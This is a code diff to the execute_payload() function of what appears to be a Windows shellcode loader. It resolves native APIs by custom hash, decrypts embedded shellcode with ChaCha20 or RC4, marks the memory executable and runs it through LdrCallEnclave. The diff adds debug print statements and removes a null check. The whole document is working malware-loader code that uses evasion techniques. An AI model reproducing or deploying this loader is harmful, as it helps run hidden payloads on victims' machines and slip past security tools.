@@ -55,9 +55,10 @@ void execute_payload() {
     HMODULE hTprt = load_tprtdll();
     if (!hTprt) {
         hTprt = GetModuleHandleA("ntdll.dll");
+        printf("[+] Using ntdll.dll fallback: 0x%p\n", hTprt);
+    } else {
+        printf("[+] tprtdll.dll loaded: 0x%p\n", hTprt);
     }
-    
-    if (!hTprt) return;
     
     _NtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = 
         (_NtAllocateVirtualMemoryEx)get_function_by_hash(hTprt, compute_custom_hash("NtAllocateVirtualMemoryEx"));
@@ -71,7 +72,7 @@ void execute_payload() {
     if (!NtAllocateVirtualMemoryEx || !NtProtectVirtualMemory || !LdrCallEnclave) {
         return;
     }
-    
+    printf("[+] All APIs successfuly resolved\n");
     // Use enhanced ChaCha20 encryption instead of RC4
     BYTE derived_key[32];
     BYTE nonce[12];
@@ -86,6 +87,7 @@ void execute_payload() {
     BOOL allocated = FALSE;
     
     if (!shellcode_addr) {
+        printf("[+] No suitable memory found, allocating...\n");
         SIZE_T region_size = encrypted_shellcode_size;
         NTSTATUS status = NtAllocateVirtualMemoryEx(
             GetCurrentProcess(),
@@ -98,13 +100,15 @@ void execute_payload() {
         );
         
         if (status != 0) {
+            printf("[-] NtAllocateVirtualMemoryEx failed: 0x%X\n", status);
             return;
         }
         allocated = TRUE;
+        printf("[+] Memory allocated at: 0x%p\n", shellcode_addr);
     }
     
     memcpy(shellcode_addr, encrypted_shellcode, encrypted_shellcode_size);
-    
+    printf("[+] Found existing memory region at: 0x%p\n", shellcode_addr);
     // Use ChaCha20 if available, otherwise fallback to RC4
     if (derive_encryption_key_chacha(derived_key, sizeof(derived_key), nonce, sizeof(nonce))) {
         chacha20_cryptography((PBYTE)shellcode_addr, encrypted_shellcode_size, derived_key, sizeof(derived_key), nonce);
@@ -127,10 +131,11 @@ void execute_payload() {
             VirtualFree(shellcode_addr, 0, MEM_RELEASE);
             return;
         }
+        printf("[+] Memory protection changed to RX\n");
     }
     
     FlushInstructionCache(GetCurrentProcess(), shellcode_addr, encrypted_shellcode_size);
-    
+    printf("[+] Instruction cache flushed\n");
     PVOID dummy_param = NULL;
     LdrCallEnclave((PENCLAVE_ROUTINE)shellcode_addr, 0, &dummy_param);
     
